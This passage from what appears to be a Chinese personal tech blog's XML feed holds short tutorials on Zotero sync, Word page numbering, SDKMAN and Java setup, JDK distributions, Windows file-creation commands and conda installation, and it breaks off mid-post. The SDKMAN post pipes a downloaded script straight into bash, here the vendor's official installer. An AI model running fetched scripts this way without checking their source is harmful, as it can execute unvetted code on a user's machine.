href="https://dav.jianguoyun.com/dav/%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%9D%9A%E6%9E%9C%E4%BA%91%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%AF%86%E7%A0%81%E6%98%AF%E4%B8%80%E5%BC%80%E5%A7%8B%E8%AE%BE%E7%BD%AE%E7%9A%84%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%EF%BC%88%E9%9D%9E%E5%9D%9A%E6%9E%9C%E4%BA%91%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%89%EF%BC%8C%E8%AE%BE%E7%BD%AE%E5%A5%BD%E5%90%8E%E9%80%89%E6%8B%A9ok%E5%8D%B3%E5%8F%AF%E3%80%82">https://dav.jianguoyun.com/dav/，用户名是坚果云账号，密码是一开始设置的应用密码（非坚果云账号登录密码），设置好后选择ok即可。</a></li></ul><p><a href="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601103235.jpg"><img src="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601103235.jpg" alt="QQ截图20170601103235"></a></p><ul><li>回到首页，点击右边的绿色的圈就可以同步更新，如果是第一次设置，会提示在坚果云里自动创建一个名叫：zotero的文件夹，用于存放同步更新的文件。</li></ul><p><a href="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601141516.jpg"><img src="http://help.jianguoyun.com/wp-content/uploads/2017/06/QQ%E6%88%AA%E5%9B%BE20170601141516.jpg" alt="QQ截图20170601141516"></a></p><h2 id="插件安装推荐"><a href="#插件安装推荐" class="headerlink" title="插件安装推荐"></a>插件安装推荐</h2><h3 id="zotero-style"><a href="#zotero-style" class="headerlink" title="zotero-style"></a>zotero-style</h3><p><a href="https://github.com/MuiseDestiny/zotero-style">MuiseDestiny/zotero-style: Ethereal Style for Zotero (github.com)</a>这是一个多彩的插件，用于增强 Zotero 的界面功能</p><h3 id="zotero-pdf-translate"><a href="#zotero-pdf-translate" class="headerlink" title="zotero-pdf-translate"></a>zotero-pdf-translate</h3><p><a href="https://github.com/windingwind/zotero-pdf-translate">windingwind/zotero-pdf-translate: Translate PDF, EPub, webpage, metadata, annotations, notes to the target language. Support 20+ translate services. (github.com)</a>深度适配 Zotero 阅读器的翻译插件</p><h3 id="jasminum"><a href="#jasminum" class="headerlink" title="jasminum"></a>jasminum</h3><p><a href="https://github.com/l0o0/jasminum">l0o0/jasminum: A Zotero add-on to retrive CNKI meta data. 一个简单的Zotero 插件，用于识别中文元数据 (github.com)</a>这个插件用来增强 Zotero 对中文文献的支持能力，包括自动更新中文 translators、根据中文文献名检索其元数据等。</p><h3 id="绿青蛙"><a href="#绿青蛙" class="headerlink" title="绿青蛙"></a>绿青蛙</h3><p><a href="https://github.com/redleafnew/zotero-updateifsE">redleafnew/zotero-updateifsE: Green Frog https://github.com/redleafnew/zotero-updateifs 的easyScholar数据版。更新影响因子，其他一系列工具，详见Readme</a>easyScholar数据版，显示更多期刊信息，详细使用见链接</p><h2 id="android下载"><a href="#android下载" class="headerlink" title="android下载"></a>android下载</h2><p><a href="https://zotero.cn.uptodown.com/android/download">下载Zotero 1.0.0-102针对于Android | Uptodown.com</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zotero-chinese.com/user-guide/">Zotero 百科全书 | Zotero 中文社区 (zotero-chinese.com)</a></p><p><a href="https://help.jianguoyun.com/?p=3168">如何在Zotero中设置webdav连接到坚果云？ | 坚果云帮助中心 (jianguoyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>word插入页码不包括封面目录</title>
      <link href="/2024/09/28/word-cha-ru-ye-ma-bu-bao-gua-feng-mian-mu-lu/"/>
      <url>/2024/09/28/word-cha-ru-ye-ma-bu-bao-gua-feng-mian-mu-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="word插入页码不包括封面目录"><a href="#word插入页码不包括封面目录" class="headerlink" title="word插入页码不包括封面目录"></a>word插入页码不包括封面目录</h1><p>依次点击布局-&gt;分隔符-&gt;下一页</p><p><img src="https://images.dadream.eu.org/images/2024/09/a0b6e41e8d3413096926bdd4b12714b8.png"></p><p>然后插入-&gt;页码-&gt;顶或底-&gt;随便一模版（插入时最后为正文首页）</p><p><img src="https://images.dadream.eu.org/images/2024/09/79a5d330c3b43502e3abeba5cab7c086.png"></p><p>然后点击链接到前一页关闭它</p><p><img src="https://images.dadream.eu.org/images/2024/09/24470b6e67ffdebaf3afad9d80eb854e.png"></p><p>然后设置页码格式</p><p><img src="https://images.dadream.eu.org/images/2024/09/a9d2b79c6d838f63ac4cbdffcf59bacc.png"></p><p>如图，然后更新目录</p><p><img src="https://images.dadream.eu.org/images/2024/09/b7693230771f988cd378852cd8d09011.png"></p>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows安装软件时中文乱码</title>
      <link href="/2024/09/21/windows-an-zhuang-ruan-jian-shi-zhong-wen-luan-ma/"/>
      <url>/2024/09/21/windows-an-zhuang-ruan-jian-shi-zhong-wen-luan-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="windows安装软件时中文乱码"><a href="#windows安装软件时中文乱码" class="headerlink" title="windows安装软件时中文乱码"></a>windows安装软件时中文乱码</h1><p>启动控制面板，将查看方式调整为 “大图标”。点击 “区域”&gt;“管理”&gt;“更改系统区域设置”，确认 “当前系统区域设置” 为中文 (简体，中国)，如果下方的复选框为勾选状态，请取消勾选。如果未勾选，请将复选框勾选。</p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>finalshell改字体</title>
      <link href="/2024/08/18/finalshell-gai-zi-ti/"/>
      <url>/2024/08/18/finalshell-gai-zi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="finalshell改字体"><a href="#finalshell改字体" class="headerlink" title="finalshell改字体"></a>finalshell改字体</h1><p>右上角点击选项-&gt;弹出对话框选择字体，点击就可修改了</p>]]></content>
      
      
      <categories>
          
          <category> tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SDKMAN教程</title>
      <link href="/2024/08/15/sdkman-jiao-cheng/"/>
      <url>/2024/08/15/sdkman-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="SDKMAN教程"><a href="#SDKMAN教程" class="headerlink" title="SDKMAN教程"></a>SDKMAN教程</h1><h3 id="1-安装-Git-Bash"><a href="#1-安装-Git-Bash" class="headerlink" title="1. 安装 Git Bash"></a>1. 安装 Git Bash</h3><p>首先，确保你已经安装了 Git Bash。如果还没有，可以从 <a href="https://gitforwindows.org/">Git for Windows</a> 下载并安装。</p><h3 id="2-使用-Git-Bash-安装-SDKMAN"><a href="#2-使用-Git-Bash-安装-SDKMAN" class="headerlink" title="2. 使用 Git Bash 安装 SDKMAN!"></a>2. 使用 Git Bash 安装 SDKMAN!</h3><h4 id="步骤-1-打开-Git-Bash"><a href="#步骤-1-打开-Git-Bash" class="headerlink" title="步骤 1: 打开 Git Bash"></a>步骤 1: 打开 Git Bash</h4><ul><li>在 Windows 上，右键点击桌面或文件夹空白处，选择 <code>Git Bash Here</code>，打开 Git Bash 终端。</li></ul><h4 id="步骤-2-安装-SDKMAN"><a href="#步骤-2-安装-SDKMAN" class="headerlink" title="步骤 2: 安装 SDKMAN!"></a>步骤 2: 安装 SDKMAN!</h4><p>在 Git Bash 中执行以下命令来安装 SDKMAN!：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token string">"https://get.sdkman.io"</span> <span class="token operator">|</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>安装完成后，执行以下命令加载 SDKMAN!：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> <span class="token string">"<span class="token environment constant">$HOME</span>/.sdkman/bin/sdkman-init.sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="步骤-3-验证安装"><a href="#步骤-3-验证安装" class="headerlink" title="步骤 3: 验证安装"></a>步骤 3: 验证安装</h4><p>输入以下命令，确认 SDKMAN! 是否安装成功：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sdk version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-使用-SDKMAN-安装-Java"><a href="#3-使用-SDKMAN-安装-Java" class="headerlink" title="3. 使用 SDKMAN! 安装 Java"></a>3. 使用 SDKMAN! 安装 Java</h3><h4 id="列出所有可安装版本"><a href="#列出所有可安装版本" class="headerlink" title="列出所有可安装版本"></a>列出所有可安装版本</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sdk list <span class="token function">java</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="安装-Java-版本"><a href="#安装-Java-版本" class="headerlink" title="安装 Java 版本"></a>安装 Java 版本</h4><p>你可以使用 SDKMAN! 安装你需要的 Java 版本，例如 Java 17：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sdk <span class="token function">install</span> <span class="token function">java</span> <span class="token number">17.0</span>.0-tem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="设置默认-Java-版本"><a href="#设置默认-Java-版本" class="headerlink" title="设置默认 Java 版本"></a>设置默认 Java 版本</h4><p>安装完成后，将 Java 17 设置为默认版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sdk default <span class="token function">java</span> <span class="token number">17.0</span>.0-tem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-配置系统环境变量（全局可用）"><a href="#4-配置系统环境变量（全局可用）" class="headerlink" title="4. 配置系统环境变量（全局可用）"></a>4. 配置系统环境变量（全局可用）</h3><p>为了让其他 Shell（如 PowerShell、CMD）也能使用 SDKMAN! 安装的 Java，需要将 Java 的路径添加到系统环境变量中。</p><h4 id="步骤-1-查找-Java-安装路径"><a href="#步骤-1-查找-Java-安装路径" class="headerlink" title="步骤 1: 查找 Java 安装路径"></a>步骤 1: 查找 Java 安装路径</h4><p>首先，找到 SDKMAN! 安装的 Java 版本路径。一般位于 <code>$HOME/.sdkman/candidates/java/current/bin</code>，具体路径可以通过以下命令在 Git Bash 中查看：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token environment constant">$HOME</span>/.sdkman/candidates/java/current/bin"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会输出类似于以下的路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/c/Users/YourUsername/.sdkman/candidates/java/current/bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="步骤-2-打开系统环境变量设置"><a href="#步骤-2-打开系统环境变量设置" class="headerlink" title="步骤 2: 打开系统环境变量设置"></a>步骤 2: 打开系统环境变量设置</h4><ol><li>右键点击 “此电脑” 或 “计算机”，选择 “属性”。</li><li>在左侧点击 “高级系统设置”。</li><li>在弹出的窗口中，点击 “环境变量” 按钮。</li></ol><h4 id="步骤-3-添加-Java-路径到系统-PATH"><a href="#步骤-3-添加-Java-路径到系统-PATH" class="headerlink" title="步骤 3: 添加 Java 路径到系统 PATH"></a>步骤 3: 添加 Java 路径到系统 <code>PATH</code></h4><ol><li><p>在系统变量下，找到 <code>Path</code> 变量并点击 “编辑”。</p></li><li><p>点击 “新建”，并添加以下路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>YourUsername<span class="token punctuation">\</span>.sdkman<span class="token punctuation">\</span>candidates<span class="token punctuation">\</span>java<span class="token punctuation">\</span>current<span class="token punctuation">\</span>bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>点击 “确定” 关闭所有窗口。</p></li></ol><h3 id="5-验证配置"><a href="#5-验证配置" class="headerlink" title="5. 验证配置"></a>5. 验证配置</h3><p>关闭所有打开的终端，然后重新打开 CMD、PowerShell 或其他终端，输入以下命令，确认 Java 版本是否正确配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到安装的 Java 版本信息，说明配置成功。</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java版本</title>
      <link href="/2024/08/15/java-ban-ben/"/>
      <url>/2024/08/15/java-ban-ben/</url>
      
        <content type="html"><![CDATA[<h1 id="Java版本"><a href="#Java版本" class="headerlink" title="Java版本"></a>Java版本</h1><p>理解 Java 的版本号、JDK（Java Development Kit），以及相关的概念。下面是对这些概念的详细解释，以及它们之间的区别和作用。</p><h2 id="1-Java-版本号"><a href="#1-Java-版本号" class="headerlink" title="1. Java 版本号"></a>1. Java 版本号</h2><p>Java 版本号标识了 Java 语言和平台的特定版本，每个版本都引入了新的特性、改进和修复。Java 版本号的格式通常是 **<code>&lt;主版本&gt;.&lt;次版本&gt;.&lt;更新版本&gt;</code>**。</p><h4 id="版本号的构成"><a href="#版本号的构成" class="headerlink" title="版本号的构成"></a>版本号的构成</h4><ul><li><strong>主版本</strong>:<ul><li>标识大的版本更新。主版本通常代表语言、平台或 API 级别的重大变化。例如，Java 8、Java 11、Java 17 等都是主版本。</li><li>Java 版本号从 1.x 系列（如 1.0、1.2、1.4、1.5）过渡到直接使用主版本号（如 8、11、17），1.5 对应的是 Java 5。</li></ul></li><li><strong>次版本</strong>:<ul><li>次版本通常是更细粒度的更新，可能引入一些小的特性、性能改进或者 API 变化。</li></ul></li><li><strong>更新版本</strong>:<ul><li>更新版本通常是针对安全性和漏洞修复的补丁版本。例如，Java 11.0.2 代表 Java 11 的第二次更新。</li></ul></li></ul><h2 id="2-JDK（Java-Development-Kit）"><a href="#2-JDK（Java-Development-Kit）" class="headerlink" title="2. JDK（Java Development Kit）"></a>2. JDK（Java Development Kit）</h2><p><strong>JDK</strong> 是开发 Java 应用程序的工具包，它包含了一系列工具、库和编译器，用于开发、编译、调试和运行 Java 应用程序。JDK 是 Java 的核心组件之一，也是每个 Java 开发者必须安装的工具。</p><h4 id="JDK-的主要组成部分"><a href="#JDK-的主要组成部分" class="headerlink" title="JDK 的主要组成部分"></a>JDK 的主要组成部分</h4><ul><li><strong>Java 编译器 (<code>javac</code>)</strong>:<ul><li>编译 Java 源代码（<code>.java</code> 文件）为字节码（<code>.class</code> 文件）。</li></ul></li><li><strong>Java 虚拟机 (<code>java</code>)</strong>:<ul><li>执行编译后的字节码，使得 Java 应用程序可以跨平台运行。</li></ul></li><li><strong>标准类库</strong>:<ul><li>包含 Java API 提供的标准类库，如集合框架、I/O 操作、网络编程等。</li></ul></li><li><strong>开发工具</strong>:<ul><li>包括调试工具（<code>jdb</code>）、文档生成工具（<code>javadoc</code>）、打包工具（<code>jar</code>）等。</li></ul></li></ul><h2 id="3-JDK-与-JRE-的区别"><a href="#3-JDK-与-JRE-的区别" class="headerlink" title="3. JDK 与 JRE 的区别"></a>3. JDK 与 JRE 的区别</h2><p><strong>JRE</strong>（Java Runtime Environment）是 Java 运行环境，它是 JDK 的一个子集，包含 JVM 和标准类库，用于运行 Java 应用程序，但不包括编译器和开发工具。</p><ul><li><strong>JDK</strong>:<ul><li>包含 JRE，用于开发和运行 Java 应用程序。</li><li>适用于开发者。</li></ul></li><li><strong>JRE</strong>:<ul><li>仅用于运行 Java 应用程序。</li><li>适用于最终用户或运行环境。</li></ul></li></ul><h2 id="4-Java-SE-Java-EE-Java-ME-的区别"><a href="#4-Java-SE-Java-EE-Java-ME-的区别" class="headerlink" title="4. Java SE, Java EE, Java ME 的区别"></a>4. Java SE, Java EE, Java ME 的区别</h2><ul><li><strong>Java SE (Standard Edition)</strong>:<ul><li>Java 标准版，包含了开发常规桌面和服务器应用程序所需的基础功能。大多数 Java 开发者都使用 Java SE。</li></ul></li><li><strong>Java EE (Enterprise Edition)</strong>:<ul><li>Java 企业版，基于 Java SE，添加了用于开发大规模分布式企业应用的额外功能，如 Web 服务、企业 JavaBeans (EJB)、Servlets、JSP 等。</li></ul></li><li><strong>Java ME (Micro Edition)</strong>:<ul><li>Java 微型版，专为嵌入式设备、移动设备和小型设备设计，包含适应这些设备的特定功能。</li></ul></li></ul><h2 id="5-版本区别与用途"><a href="#5-版本区别与用途" class="headerlink" title="5. 版本区别与用途"></a>5. 版本区别与用途</h2><p>每个 Java 版本都会引入新的特性和改进，因此理解不同版本的区别对选择合适的开发环境非常重要。</p><ul><li><strong>Java 8 (LTS)</strong>:<ul><li>被广泛使用的 LTS 版本，引入了 Lambda 表达式、Stream API、默认方法等关键特性。</li></ul></li><li><strong>Java 11 (LTS)</strong>:<ul><li>继 Java 8 之后的另一个 LTS 版本，引入了新的 HTTP Client API、局部变量类型推断 (<code>var</code>) 等。</li></ul></li><li><strong>Java 17 (LTS)</strong>:<ul><li>最新的 LTS 版本，包含了大量的新特性和改进，如封闭类、增强的 Switch 表达式等。</li></ul></li><li><strong>非 LTS 版本</strong>:<ul><li>这些版本在发布后的短期内得到支持，主要用于引入和测试新特性。如 Java 9、10、12、13 等。</li></ul></li></ul><h2 id="6-常见的-JDK-实现及其特点"><a href="#6-常见的-JDK-实现及其特点" class="headerlink" title="6. 常见的 JDK 实现及其特点"></a>6. 常见的 JDK 实现及其特点</h2><h3 id="1-Oracle-JDK"><a href="#1-Oracle-JDK" class="headerlink" title="1. Oracle JDK"></a>1. <strong>Oracle JDK</strong></h3><ul><li><strong>Oracle JDK</strong> 是 Oracle 公司官方发布的 Java 开发工具包，是 Java SE（Standard Edition）的参考实现。</li><li>特点:<ul><li>商业版（从 JDK 11 开始），需要商业许可证用于生产环境，但开发和测试用途免费。</li><li>定期更新和安全修补。</li></ul></li><li>版本:<ul><li>LTS（长期支持）版本：8、11、17 等。</li><li>非 LTS 版本：12、13、14、15、16、18、19 等。</li></ul></li></ul><h3 id="2-OpenJDK"><a href="#2-OpenJDK" class="headerlink" title="2. OpenJDK"></a>2. <strong>OpenJDK</strong></h3><ul><li><strong>OpenJDK</strong> 是一个开源的 JDK 实现，由 Oracle 和其他社区成员共同维护，是 Oracle JDK 的基础。</li><li>特点:<ul><li>开源且免费使用。</li><li>与 Oracle JDK 基本相同，但可能缺少一些商业特性。</li></ul></li><li>版本:<ul><li>和 Oracle JDK 同步的版本：8、11、17 等。</li><li>提供最新的非 LTS 版本。</li></ul></li></ul><h3 id="3-Adoptium-Eclipse-Temurin"><a href="#3-Adoptium-Eclipse-Temurin" class="headerlink" title="3. Adoptium (Eclipse Temurin)"></a>3. <strong>Adoptium (Eclipse Temurin)</strong></h3><ul><li><strong>Adoptium</strong> 前身为 AdoptOpenJDK，现在由 Eclipse 基金会管理。</li><li>特点:<ul><li>社区驱动的开源 JDK 发行版。</li><li>提供高质量的二进制构建，适用于不同平台。</li></ul></li><li>版本:<ul><li>支持 LTS 版本：8、11、17 等。</li><li>提供非 LTS 版本。</li></ul></li></ul><h3 id="4-Amazon-Corretto"><a href="#4-Amazon-Corretto" class="headerlink" title="4. Amazon Corretto"></a>4. <strong>Amazon Corretto</strong></h3><ul><li><strong>Amazon Corretto</strong> 是由亚马逊发布的免费、开源的 JDK 发行版。</li><li>特点:<ul><li>亚马逊维护，包含长时间的支持和性能改进。</li><li>完全兼容 OpenJDK。</li></ul></li><li>版本:<ul><li>提供 LTS 版本：8、11、17 等。</li><li>提供非 LTS 版本。</li></ul></li></ul><h3 id="5-Azul-Zulu"><a href="#5-Azul-Zulu" class="headerlink" title="5. Azul Zulu"></a>5. <strong>Azul Zulu</strong></h3><ul><li><strong>Azul Zulu</strong> 是由 Azul 公司发布的一个商业支持的 OpenJDK 发行版。</li><li>特点:<ul><li>商业支持，适用于企业环境。</li><li>提供与不同平台兼容的版本，包括 Windows、Linux、macOS 和嵌入式系统。</li></ul></li><li>版本:<ul><li>支持 LTS 版本：8、11、17 等。</li><li>提供非 LTS 版本。</li></ul></li></ul><h3 id="6-GraalVM"><a href="#6-GraalVM" class="headerlink" title="6. GraalVM"></a>6. <strong>GraalVM</strong></h3><ul><li><strong>GraalVM</strong> 是 Oracle 提供的一个高性能、可扩展的 Java 虚拟机，它也是一个多语言开发环境。</li><li>特点:<ul><li>支持多语言运行时，包括 Java、JavaScript、Python、Ruby 等。</li><li>提供本机映像生成（Native Image）功能。</li></ul></li><li>版本:<ul><li>基于 OpenJDK 构建，版本与 OpenJDK 保持一致。</li></ul></li></ul><h3 id="7-Red-Hat-OpenJDK"><a href="#7-Red-Hat-OpenJDK" class="headerlink" title="7. Red Hat OpenJDK"></a>7. <strong>Red Hat OpenJDK</strong></h3><ul><li><strong>Red Hat OpenJDK</strong> 是由 Red Hat 提供的 OpenJDK 构建，主要针对企业级应用。</li><li>特点:<ul><li>提供商业支持和长期支持。</li><li>常用于 Red Hat Enterprise Linux（RHEL）环境中。</li></ul></li><li>版本:<ul><li>支持 LTS 版本：8、11、17 等。</li><li>提供非 LTS 版本。</li></ul></li></ul><h3 id="8-SAP-Machine"><a href="#8-SAP-Machine" class="headerlink" title="8. SAP Machine"></a>8. <strong>SAP Machine</strong></h3><ul><li><strong>SAP Machine</strong> 是 SAP 发布的 OpenJDK 发行版。</li><li>特点:<ul><li>用于 SAP 产品和客户的支持环境。</li><li>完全开源，兼容 OpenJDK。</li></ul></li><li>版本:<ul><li>支持 LTS 版本：8、11、17 等。</li></ul></li></ul><h3 id="9-Liberica-JDK"><a href="#9-Liberica-JDK" class="headerlink" title="9. Liberica JDK"></a>9. <strong>Liberica JDK</strong></h3><ul><li><strong>Liberica JDK</strong> 是由 BellSoft 发布的 OpenJDK 发行版。</li><li>特点:<ul><li>提供全功能 JDK，包括完整的 JavaFX 支持。</li><li>提供不同平台和操作系统的兼容版本。</li></ul></li><li>版本:<ul><li>支持 LTS 版本：8、11、17 等。</li><li>提供非 LTS 版本。</li></ul></li></ul><h2 id="7-SDK-Software-Development-Kit"><a href="#7-SDK-Software-Development-Kit" class="headerlink" title="7. SDK (Software Development Kit)"></a>7. SDK (Software Development Kit)</h2><p><strong>SDK</strong> 是软件开发工具包（Software Development Kit）的缩写。它通常包括了一组开发工具、库、示例代码、文档和其他资源，帮助开发者构建应用程序。对于 JVM 生态系统中的 SDK，最常见的例子是 Java 开发工具包（<strong>JDK</strong>，Java Development Kit）。</p><ul><li>JDK: JDK 是 Java 的官方 SDK，包含了开发 Java 应用程序所需的所有工具和库。JDK 中主要包括：<ul><li><strong>Java 编译器（javac）</strong>: 用于将 Java 源代码编译成字节码（.class 文件）。</li><li><strong>Java 运行时环境（JRE）</strong>: 包含 JVM 和标准 Java 类库，负责运行 Java 应用程序。</li><li><strong>其他工具</strong>: 如 <code>javadoc</code>（生成文档的工具）、<code>jdb</code>（Java 调试器）等。</li></ul></li></ul><p>除了 JDK，其他 JVM 语言（如 Scala、Kotlin）也有自己的 SDK，这些 SDK 提供了用于编译、运行和调试这些语言的工具。</p><h2 id="8-JVM-工具"><a href="#8-JVM-工具" class="headerlink" title="8. JVM 工具"></a>8. JVM 工具</h2><p><strong>JVM 工具</strong> 是指那些用于开发、管理和优化基于 JVM 的应用程序的工具。这些工具帮助开发者在 JVM 上构建和管理应用程序，包括编译、运行、调试、打包、依赖管理等方面。</p><ul><li><p><strong>JVM</strong> 是 Java 程序的运行环境。Java 代码在编译器的帮助下转化为字节码，这些字节码由 JVM 来执行。JVM 为不同的操作系统提供了统一的运行环境。</p></li><li><p>Java 程序跨平台性的实现依赖于 JVM。Java 编译器将源代码编译成与平台无关的字节码，JVM 则负责在不同平台上将字节码解释成机器码并执行。因此，只要平台有适配的 JVM，Java 程序就可以在上面运行，无需修改代码。</p></li><li><p>虽然 JVM 是为 Java 设计的，但由于它的通用性，其他语言（如 Scala、Kotlin、Groovy 等）也可以编译为 JVM 字节码，并在 JVM 上运行。因此，JVM 并不局限于 Java 语言，它已经发展为支持多种语言的强大平台。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows创建文件</title>
      <link href="/2024/08/12/windows-chuang-jian-wen-jian/"/>
      <url>/2024/08/12/windows-chuang-jian-wen-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="windows创建文件"><a href="#windows创建文件" class="headerlink" title="windows创建文件"></a>windows创建文件</h1><h3 id="1-使用-echo-命令"><a href="#1-使用-echo-命令" class="headerlink" title="1. 使用 echo 命令"></a>1. 使用 <code>echo</code> 命令</h3><p>你可以使用 <code>echo</code> 命令将内容写入一个新的文件中：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">echo 文件内容 &gt; 文件名.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果文件已经存在，这个命令会覆盖原来的内容。</p><h3 id="2-使用-type-nul-命令"><a href="#2-使用-type-nul-命令" class="headerlink" title="2. 使用 type nul 命令"></a>2. 使用 <code>type nul</code> 命令</h3><p>这个命令可以创建一个空文件：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">type nul &gt; 文件名.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-使用-copy-con-命令"><a href="#3-使用-copy-con-命令" class="headerlink" title="3. 使用 copy con 命令"></a>3. 使用 <code>copy con</code> 命令</h3><p><code>copy con</code> 可以创建文件并直接输入内容：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">copy con 文件名.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入完内容后，按 <code>Ctrl + Z</code> 然后回车保存并退出。</p><h3 id="4-使用-fsutil-命令"><a href="#4-使用-fsutil-命令" class="headerlink" title="4. 使用 fsutil 命令"></a>4. 使用 <code>fsutil</code> 命令</h3><p><code>fsutil</code> 可以创建指定大小的文件（以字节为单位）：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">fsutil file createnew 文件名.txt 文件大小（以字节为单位）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-使用-PowerShell-的-New-Item-cmdlet"><a href="#5-使用-PowerShell-的-New-Item-cmdlet" class="headerlink" title="5. 使用 PowerShell 的 New-Item cmdlet"></a>5. 使用 PowerShell 的 <code>New-Item</code> cmdlet</h3><p>在PowerShell中，你可以使用 <code>New-Item</code> 来创建文件：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">New-Item -Path .\文件名.txt -ItemType File<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>conda安装及使用</title>
      <link href="/2024/08/12/conda-an-zhuang-ji-shi-yong/"/>
      <url>/2024/08/12/conda-an-zhuang-ji-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="conda安装及使用"><a href="#conda安装及使用" class="headerlink" title="conda安装及使用"></a>conda安装及使用</h1><h3 id="Conda-的安装"><a href="#Conda-的安装" class="headerlink" title="Conda 的安装"></a>Conda 的安装</h3><h4 id="1-使用-Anaconda-安装"><a href="#1-使用-Anaconda-安装" class="headerlink" title="1. 使用 Anaconda 安装"></a>1. 使用 Anaconda 安装</h4><ul><li><strong>Anaconda</strong> 是一个包含了 Python 和众多常用库（如 NumPy、Pandas、SciPy、Jupyter Notebook 等）的数据科学平台。它自带 <code>conda</code>，适合需要完整数据科学工具包的用户。</li></ul><h4 id="2-使用-Miniconda-安装"><a href="#2-使用-Miniconda-安装" class="headerlink" title="2. 使用 Miniconda 安装"></a>2. 使用 Miniconda 安装</h4><ul><li><strong>Miniconda</strong> 是一个轻量级安装包，只包含 <code>conda</code> 和 Python，适合那些希望灵活选择并安装所需包的用户。</li></ul><h5 id="安装步骤："><a href="#安装步骤：" class="headerlink" title="安装步骤："></a>安装步骤：</h5><ol><li><p><strong>下载 Miniconda 安装程序</strong></p><ul><li>访问 Miniconda 下载页面。</li><li>选择适合你操作系统的版本（Windows、macOS、Linux）并下载。</li></ul></li><li><p><strong>安装 Miniconda</strong></p><ul><li><p><strong>Windows</strong>：双击下载的 <code>.exe</code> 文件并按照提示安装。</p></li><li><p>macOS/Linux</p><p>：在终端中运行下载的 .sh文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> Miniconda3-latest-MacOSX-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> Miniconda3-latest-Linux-x86_64.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>添加环境变量</p><p>如果你在安装时未勾选添加 <code>conda</code> 到 <code>PATH</code> 